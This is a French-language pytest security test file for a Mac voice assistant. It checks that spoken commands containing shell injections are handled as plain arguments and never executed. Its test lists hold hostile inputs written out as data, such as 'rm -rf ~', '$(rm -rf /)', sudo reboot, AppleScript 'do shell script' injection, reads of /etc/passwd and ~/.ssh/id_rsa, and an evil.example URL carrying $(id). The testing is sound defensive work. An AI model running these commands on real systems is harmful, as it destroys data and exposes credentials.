"""Injection (§9.3) : « ouvre ; rm -rf ~ » et ses cousines n'exécutent rien de dangereux. Chaque phrase piégée passe
par la vraie chaîne (compréhension → session → actions) sur le faux Mac ; tout appel doit avoir une forme permise,
et les fichiers témoins ne doivent jamais apparaître."""

from __future__ import annotations

from pathlib import Path

import pytest

from tests.faux_mac import FauxMac
from tests.securite.appels import appel_conforme
from voix.actions.executeur import MODULES, SYSTEME
from voix.nlu.alias import lire
from voix.session import Session

PIEGES = [
    "ouvre ; rm -rf ~", "lance $(rm -rf /)", "ouvre `whoami`", "ferme && sudo reboot", "ouvre | sh",
    "ouvre ../../etc/passwd", "va sur javascript:alert(1)", "lance /bin/sh", "ouvre file:///etc/hosts",
    "cherche ; touch {T}", "cherche $(touch {T})", "cherche le fichier `touch {T}`", "cherche -0 && touch {T}",
    "cherche sur Google \"; touch {T}; echo \"", "cherche sur YouTube $(touch {T})", "traduis $(touch {T}) en anglais",
    "rappelle-moi dans 5 minutes de $(touch {T})", "rappelle-moi dans 5 minutes de \"; do shell script \"touch {T}",
    "lance le raccourci ; touch {T}", "lance le raccourci Heure du café ; touch {T}", "mode $(touch {T})",
    "ambiance code; touch {T}", "volume à 30 ; touch {T}", "monte le son de 20$(touch {T})", "ouvre ~/.ssh/id_rsa",
    "ouvre /etc/passwd", "ouvre le dossier /", "va sur https://evil.example/$(id)", "itinéraire vers $(touch {T})",
    "ouvre le 2 ; touch {T}", "cherche facture\n touch {T}", "ferme Safari\x00rm", "ouvre " + "A" * 600,
    "écris dans le terminal rm -rf", "tape rm -rf dans le terminal", "exécute rm -rf ~", "exécute sudo shutdown",
]  # fmt: skip


@pytest.mark.parametrize("piege", PIEGES)
def test_piege(mac: FauxMac, piege: str) -> None:
    temoin = mac.racine / "pwned"
    phrase = piege.replace("{T}", str(temoin))
    mac.regler(mdfind=[str(mac.maison / "Documents")])
    s = Session(mac.outils(modules=dict.fromkeys(MODULES, "")))
    for p in (phrase, "oui", "ouvre le 2"):
        s.entendre(p)
    assert not temoin.exists()
    for prog, argv in mac.appels():
        assert prog in SYSTEME or prog in MODULES
        assert appel_conforme(prog, argv, mac.maison.resolve()), (prog, argv)
    for ordre, params in mac.pont.ordres:
        assert not any(isinstance(v, str) and ("touch" in v or "$(" in v) for v in params.values()), (ordre, params)


def test_le_texte_libre_reste_un_argument(mac: FauxMac) -> None:
    """Un texte piégé est passé tel quel, en argument, à un programme qui ne l'interprète pas."""
    s = Session(mac.outils())
    s.entendre("cherche le fichier facture $(id)")
    prog, argv = mac.appels()[0]
    assert prog == "mdfind" and argv[-1] == "facture $ id"  # un argument tel quel : mdfind ne l'exécute pas


def test_alias_pieges_refuses_au_chargement(tmp_path: Path) -> None:
    maison = tmp_path / "maison"
    maison.mkdir()
    toml = "".join(
        f'[[alias]]\nnom = "a{i}"\ncible = "{c}"\n'
        for i, c in enumerate(
            [
                "/etc/passwd",
                "~/../../etc",
                "file:///etc/hosts",
                "javascript:alert(1)",
                "http://x.fr",
                "https://x.fr/a b",
                "app:../../bin/sh",
                "rm -rf ~",
            ]
        )  # fmt: skip
    )
    c = lire(toml, maison)
    assert c.alias == [] and len(c.erreurs) == 8


def test_un_alias_vers_un_script_ne_lance_rien(mac: FauxMac) -> None:
    script = mac.maison / "Documents" / "piege.command"
    script.write_text("#!/bin/sh\ntouch /tmp/pwned\n")
    c = lire(f'[[alias]]\nnom = "mon script"\ncible = "{script}"\n', mac.maison)
    o = mac.outils(commandes=c)
    o.catalogue.ajouter(c.alias)
    r = Session(o).entendre("ouvre mon script")
    assert r.statut == "erreur" and "s'exécute" in r.texte and mac.appels() == []
